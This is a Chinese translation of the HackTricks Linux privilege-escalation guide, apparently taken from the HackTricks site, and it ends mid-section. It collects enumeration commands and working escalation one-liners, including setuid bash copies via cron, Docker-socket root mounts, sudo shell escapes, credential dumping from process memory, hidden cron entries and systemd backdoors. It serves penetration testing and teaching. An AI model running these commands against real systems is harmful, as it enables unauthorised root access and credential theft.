# Linux提权

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 系统信息

### 操作系统信息

让我们开始获取运行的操作系统的一些信息。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 路径

如果您**对`PATH`变量中的任何文件夹具有写权限**，则可能能够劫持一些库或二进制文件：
```bash
echo $PATH
```
### 环境信息

环境变量中是否包含有趣的信息、密码或 API 密钥？
```bash
(env || set) 2>/dev/null
```
### 内核漏洞

检查内核版本，看是否存在可用于提升权限的漏洞。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
您可以在此处找到一份良好的易受攻击内核列表以及一些已经**编译好的利用程序**：[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)。\
其他一些可以找到**编译好的利用程序**的网站：[https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有易受攻击的内核版本，您可以执行以下操作：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
以下是一些可用于搜索内核漏洞利用的工具：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（仅在受害者中执行，仅检查内核2.x的漏洞）

始终**在Google中搜索内核版本**，也许你的内核版本已经写在某个内核漏洞中，这样你就可以确保该漏洞是有效的。

### CVE-2016-5195（DirtyCow）

Linux权限提升 - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo版本

基于出现在以下漏洞sudo版本：
```bash
searchsploit sudo
```
您可以使用以下grep命令检查sudo版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg签名验证失败

检查**HTB的smasher2 box**，了解如何利用此漏洞的**示例**。
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 枚举可能的防御措施

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

### Grsecurity

Grsecurity是一个Linux内核安全增强补丁，提供了许多安全功能，包括随机化内核地址、限制/控制系统调用、强制ASLR等。 Grsecurity还提供了一些防止特权升级的功能，如PAX、RBAC等。
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX

PaX是一个Linux内核补丁，用于增强内核的安全性。
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

地址空间布局随机化（ASLR）是一种安全机制，可在系统启动时随机分配进程的内存地址，从而增加攻击者利用漏洞进行攻击的难度。
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker逃逸

如果你在一个Docker容器内部，你可以尝试从中逃脱：

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## 驱动器

检查已挂载和未挂载的**内容**，以及它们的位置和原因。如果有任何未挂载的内容，你可以尝试挂载它并检查是否包含私人信息。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

列举有用的二进制文件
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
另外，检查是否**已安装任何编译器**。如果您需要使用某些内核利用技术，这将非常有用，因为建议在您打算使用它的机器上（或类似的机器上）进行编译。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查已安装软件包和服务的版本。也许有一些旧的 Nagios 版本（例如）可能被利用来提升权限...\
建议手动检查更可疑的已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果您可以访问机器的SSH，您还可以使用**openVAS**来检查机器内安装的过时和易受攻击的软件。

{% hint style="info" %}
_请注意，这些命令将显示大量大多数情况下无用的信息，因此建议使用一些类似OpenVAS的应用程序，它将检查安装的软件版本是否容易受到已知漏洞的影响_
{% endhint %}

## 进程

查看正在执行的**进程**，并检查是否有任何进程具有**比应有的更多权限**（也许是由root执行的tomcat？）
```bash
ps aux
ps -ef
top -n 1
```
始终检查可能正在运行的[**electron/cef/chromium调试器**，您可以滥用它来提升权限](electron-cef-chromium-debugger-abuse.md)。**Linpeas**通过检查进程的命令行中的`--inspect`参数来检测这些调试器。\
还要**检查您对进程二进制文件的权限**，也许您可以覆盖某人的权限。

### 进程监控

您可以使用像[**pspy**](https://github.com/DominicBreuker/pspy)这样的工具来监视进程。这对于识别频繁执行的易受攻击的进程或在满足一组要求时非常有用。

### 进程内存

服务器的一些服务会在内存中以**明文**保存**凭据**。\
通常，您需要**root权限**才能读取属于其他用户的进程的内存，因此当您已经是root并希望发现更多凭据时，这通常更有用。\
但是，请记住**作为普通用户，您可以读取自己拥有的进程的内存**。

{% hint style="warning" %}
请注意，如今大多数机器**默认不允许ptrace**，这意味着您无法转储属于您非特权用户的其他进程。

文件 _**/proc/sys/kernel/yama/ptrace\_scope**_ 控制ptrace的可访问性：

* **kernel.yama.ptrace\_scope = 0**：只要它们具有相同的uid，所有进程都可以被调试。这是ptracing的经典方式。
* **kernel.yama.ptrace\_scope = 1**：只有父进程可以被调试。
* **kernel.yama.ptrace\_scope = 2**：只有管理员可以使用ptrace，因为它需要CAP\_SYS\_PTRACE功能。
* **kernel.yama.ptrace\_scope = 3**：不允许使用ptrace跟踪任何进程。设置后，需要重新启动才能再次启用ptracing。
{% endhint %}

#### GDB

如果您可以访问FTP服务的内存（例如），您可以获取Heap并在其中搜索凭据。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB脚本

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程ID，**maps文件显示了内存在该进程的虚拟地址空间中是如何映射的**；它还显示了**每个映射区域的权限**。**mem** 伪文件**暴露了进程的内存本身**。从 **maps** 文件中，我们知道哪些**内存区域是可读的**以及它们的偏移量。我们利用这些信息**定位到mem文件并将所有可读区域转储到一个文件中**。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`提供对系统的**物理**内存的访问，而不是虚拟内存。内核的虚拟地址空间可以使用`/dev/kmem`来访问。\
通常，`/dev/mem`只能被**root**和**kmem**组读取。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for Linux

ProcDump是Sysinternals工具套件中经典ProcDump工具的Linux重新设计版本。在[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)获取。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要转储进程内存，您可以使用：

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump)（需要 root 权限）- \_您可以手动删除 root 要求并转储您拥有的进程
* [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) 中的脚本 A.5（需要 root 权限）

### 从进程内存中获取凭据

#### 手动示例

如果发现认证进程正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
你可以转储进程（查看前面的部分以找到转储进程内存的不同方法），并在内存中搜索凭据：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

该工具[**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin)将从内存和一些**知名文件**中**窃取明文凭证**。它需要root权限才能正常工作。

| 功能                                               | 进程名称             |
| ------------------------------------------------- | -------------------- |
| GDM密码（Kali桌面，Debian桌面）                    | gdm-password         |
| Gnome Keyring（Ubuntu桌面，ArchLinux桌面）         | gnome-keyring-daemon |
| LightDM（Ubuntu桌面）                              | lightdm              |
| VSFTPd（活动FTP连接）                              | vsftpd               |
| Apache2（活动HTTP基本认证会话）                    | apache2              |
| OpenSSH（活动SSH会话 - Sudo使用）                  | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 定时任务/Cron 作业

检查是否有任何可被利用的定时任务。也许你可以利用由 root 执行的脚本（通配符漏洞？可以修改 root 使用的文件？使用符号链接？在 root 使用的目录中创建特定文件？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron路径

例如，在_/etc/crontab_文件中，您可以找到路径：_PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（_请注意用户"user"对/home/user目录具有写入权限_）

如果在这个crontab文件中，root用户尝试执行一些命令或脚本而没有设置路径。例如：_\* \* \* \* root overwrite.sh_\
然后，您可以通过以下方式获得root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### 使用带通配符的脚本的 Cron 作业（通配符注入）

如果由 root 执行的脚本中的命令包含“**\***”，您可以利用这一点执行意外操作（如权限提升）。示例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果通配符前面有路径，比如** _**/some/path/\***_ **，它就不会有漏洞（即使** _**./\***_ **也不会有）。**

阅读以下页面以了解更多通配符利用技巧：

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Cron脚本覆盖和符号链接

如果**可以修改由root执行的cron脚本**，你可以非常容易地获得一个shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由root执行的脚本使用了**你拥有完全访问权限的目录**，也许删除该文件夹并**创建一个符号链接文件夹到另一个**，以便运行你控制的脚本可能会很有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 频繁的 cron 作业

您可以监视进程，以搜索每隔 1、2 或 5 分钟执行一次的进程。也许您可以利用它来提升权限。

例如，要在 1 分钟内**每 0.1 秒监视**，**按最少执行的命令排序**并删除已执行最多次的命令，您可以执行：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**您也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（这将监视并列出每个启动的进程）。

### 隐形的定时任务

可以通过在注释后面**插入一个回车符**（没有换行符）来创建一个定时任务，这样定时任务将会生效。示例（注意回车符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写的 _.service_ 文件

检查是否可以写入任何 `.service` 文件，如果可以，您**可以修改它**以便在服务**启动**、**重新启动**或**停止**时**执行**您的**后门**（也许您需要等到机器重新启动）。\
例如，在 .service 文件中创建您的后门，使用**`ExecStart=/tmp/script.sh`**

### 可写的服务二进制文件

请记住，如果您对服务执行的二进制文件具有**写入权限**，您可以将它们更改为后门，这样当服务重新执行时，后门将被执行。

### systemd 路径 - 相对路径

您可以查看**systemd**使用的路径：
```bash
systemctl show-environment
```
如果发现可以在路径中的任何文件夹中**写入**，可能可以**提升权限**。您需要搜索服务配置文件中使用的**相对路径**，例如：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在您可以编写的systemd PATH文件夹中创建一个与相对路径二进制文件同名的**可执行文件**，当服务被要求执行易受攻击的操作（**启动**、**停止**、**重新加载**）时，将执行您的**后门**（通常非特权用户无法启动/停止服务，但请检查是否可以使用 `sudo -l`）。

**了解有关服务的更多信息，请使用 `man systemd.service`。**

## **定时器**

**定时器**是以`**.timer**`结尾的systemd单元文件，用于控制`**.service**`文件或事件。**定时器**可用作cron的替代方案，因为它们内置支持日历时间事件和单调时间事件，并且可以异步运行。

您可以使用以下命令枚举所有定时器：
```bash
systemctl list-timers --all
```
### 可写的定时器

如果您可以修改一个定时器，您可以让它执行一些 `systemd.unit` 中存在的内容（比如 `.service` 或 `.target`）。
```bash
Unit=backdoor.service
```
在文档中，您可以阅读有关 Unit 的内容：

> 当此定时器到期时要激活的单元。参数是一个单元名称，其后缀不是 ".timer"。如果未指定，则此值默认为与定时器单元同名的服务，除了后缀。（见上文。）建议激活的单元名称和定时器单元的单元名称相同，除了后缀。

因此，要滥用此权限，您需要：

* 找到一些 systemd 单元（如 `.service`），其中**执行可写二进制文件**
* 找到一些 systemd 单元，其中**执行相对路径**，并且您对**systemd PATH**具有**可写权限**（以冒充该可执行文件）

**通过 `man systemd.timer` 了解更多关于定时器的信息。**

### **启用定时器**

要启用定时器，您需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意**计时器**是通过在`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`上创建符号链接来**激活**的。

## 套接字

Unix 域套接字 (UDS) 在客户端-服务器模型中允许**进程通信**，可以在同一台或不同的计算机上进行通信。它们利用标准的 Unix 描述符文件进行计算机间通信，并通过`.socket`文件进行设置。

套接字可以使用`.socket`文件进行配置。

**通过 `man systemd.socket` 了解更多关于套接字的信息。** 在这个文件中，可以配置几个有趣的参数：

* `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`：这些选项不同，但总结起来用于**指示套接字将在何处监听**（AF_UNIX 套接字文件的路径、要监听的 IPv4/6 和/或端口号等）。
* `Accept`：接受一个布尔参数。如果为**true**，则为每个传入连接**生成一个服务实例**，并且只传递连接套接字给它。如果为**false**，则所有监听套接字本身都会**传递给启动的服务单元**，并且只为所有连接生成一个服务单元。对于数据报套接字和 FIFO，在那里一个单一的服务单元无条件地处理所有传入流量。**默认为 false**。出于性能原因，建议仅以适合 `Accept=no` 的方式编写新的守护程序。
* `ExecStartPre`、`ExecStartPost`：接受一个或多个命令行，这些命令行在创建和绑定监听**套接字**/FIFO 之前或之后**执行**。命令行的第一个标记必须是绝对文件名，然后是进程的参数。
* `ExecStopPre`、`ExecStopPost`：额外的**命令**，在关闭和移除监听**套接字**/FIFO 之前或之后**执行**。
* `Service`：指定在**传入流量**上**激活**的**服务**单元名称。此设置仅允许用于 `Accept=no` 的套接字。默认为与套接字同名的服务（后缀被替换）。在大多数情况下，不应该需要使用此选项。

### 可写的 .socket 文件

如果找到一个**可写的**`.socket`文件，你可以在`[Socket]`部分的开头添加类似于：`ExecStartPre=/home/kali/sys/backdoor`，那么在创建套接字之前将执行后门。因此，你**可能需要等待机器重启。**\
_请注意系统必须使用该套接字文件配置，否则后门将不会被执行_

### 可写套接字

如果**识别到任何可写套接字**（现在我们谈论的是 Unix 套接字，而不是配置`.socket`文件），那么**你可以与该套接字通信**，也许利用漏洞。

### 枚举 Unix 套接字
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**利用示例:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP sockets

请注意，可能有一些**监听HTTP请求的套接字**（_我指的不是.socket文件，而是充当Unix套接字的文件_）。您可以使用以下命令检查：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
如果套接字**响应HTTP**请求，则可以与其**通信**，并可能**利用一些漏洞**。

### 可写的Docker套接字

Docker套接字通常位于`/var/run/docker.sock`，这是一个应该得到保护的关键文件。默认情况下，它可被`root`用户和`docker`组的成员写入。拥有对此套接字的写访问权限可能导致特权升级。以下是如何执行此操作的详细步骤，以及在无法使用Docker CLI时的替代方法。

#### **使用Docker CLI进行特权升级**

如果您可以写入Docker套接字，则可以使用以下命令升级特权：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许您以根级访问主机文件系统来运行容器。

#### **直接使用 Docker API**

在没有 Docker CLI 的情况下，仍然可以使用 Docker API 和 `curl` 命令来操作 Docker 套接字。

1. **列出 Docker 镜像：**
检索可用镜像列表。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2. **创建容器：**
发送请求以创建一个容器，该容器挂载主机系统的根目录。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

启动新创建的容器：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3. **附加到容器：**
使用 `socat` 建立与容器的连接，从而在其中启用命令执行。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

建立 `socat` 连接后，您可以直接在容器中执行命令，以根级访问主机文件系统。

### 其他

请注意，如果您对 Docker 套接字拥有写权限，因为您在 **`docker` 组内**，您有[**更多提升权限的方法**](interesting-groups-linux-pe/#docker-group)。如果 [**docker API 在某个端口上监听**，您也可以可能对其进行妥协](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

查看 **更多从 Docker 中突破或滥用以提升权限的方法**：

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) 特权升级

如果您发现可以使用 **`ctr`** 命令，请阅读以下页面，因为**您可能能够滥用它来提升权限**：

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** 特权升级

如果您发现可以使用 **`runc`** 命令，请阅读以下页面，因为**您可能能够滥用它来提升权限**：

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus 是一种复杂的**进程间通信（IPC）系统**，使应用程序能够高效地交互和共享数据。设计时考虑到现代 Linux 系统，它为不同形式的应用程序通信提供了强大的框架。

该系统功能多样，支持增强数据交换的基本 IPC，类似于**增强的 UNIX 域套接字**。此外，它有助于广播事件或信号，促进系统组件之间的无缝集成。例如，蓝牙守护程序发出有关来电的信号可能会提示音乐播放器静音，增强用户体验。此外，D-Bus 支持远程对象系统，简化了应用程序之间的服务请求和方法调用，简化了传统上复杂的流程。

D-Bus 采用**允许/拒绝模型**，根据匹配策略规则的累积效果管理消息权限（方法调用、信号发射等）。这些策略规定了与总线的交互，可能通过利用这些权限的漏洞实现特权升级。

在 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中提供了一个策略示例，详细说明了允许根用户拥有、发送到和接收来自 `fi.w1.wpa_supplicant1` 的消息的权限。

未指定用户或组的策略适用于所有情况，而“默认”上下文策略适用于所有未被其他特定策略覆盖的情况。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**学习如何枚举和利用 D-Bus 通信：**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **网络**

枚举网络并确定机器位置总是很有趣。

### 通用枚举
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 开放端口

在访问之前，始终检查在机器上运行的网络服务，这些服务可能是您之前无法与之交互的。
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### 嗅探

检查是否可以嗅探流量。如果可以的话，可能能够获取一些凭据。
```
timeout 1 tcpdump
```
## 用户

### 通用枚举

检查您是**谁**，您拥有哪些**特权**，系统中有哪些**用户**，哪些可以**登录**，哪些拥有**root特权**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大 UID

一些Linux版本受到一个bug的影响，允许具有**UID > INT\_MAX**的用户提升权限。更多信息: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) 和 [here](https://twitter.com/paragonsec/status/1071152249529884674)。\
**利用方法**：使用 **`systemd-run -t /bin/bash`**

### 用户组

检查是否是**某个用户组的成员**，该用户组可能授予您root权限：

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### 剪贴板

检查剪贴板中是否有任何有趣的内容（如果可能）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果你**知道环境中的任何密码**，尝试使用密码**登录每个用户**。

### Su Brute

如果不介意制造很多噪音，并且计算机上存在`su`和`timeout`二进制文件，你可以尝试使用[su-bruteforce](https://github.com/carlospolop/su-bruteforce)来暴力破解用户。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)在使用`-a`参数时也会尝试暴力破解用户。

## 可写的 PATH 滥用

### $PATH

如果你发现你可以**在$PATH的某个文件夹中写入**，你可能可以通过在可写文件夹中创建一个名为将由不同用户（最好是root）执行的某个命令的后门来**提升权限**，而该命令**不是从$PATH中位于你的可写文件夹之前的文件夹加载**。

### SUDO 和 SUID

你可能被允许使用sudo执行某些命令，或者它们可能具有suid位。使用以下命令进行检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一些**意外的命令允许您读取和/或写入文件，甚至执行命令。** 例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo配置可能允许用户在不知道密码的情况下以另一个用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个例子中，用户 `demo` 可以将 `vim` 作为 `root` 运行，现在可以通过将一个 ssh 密钥添加到根目录或调用 `sh` 来轻松获取 shell。
```
sudo vim -c '!sh'
```
### SETENV

该指令允许用户在执行某些操作时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
这个例子，**基于HTB机器Admirer**，存在**PYTHONPATH劫持**漏洞，可以在以root权限执行脚本时加载任意Python库：
```bash
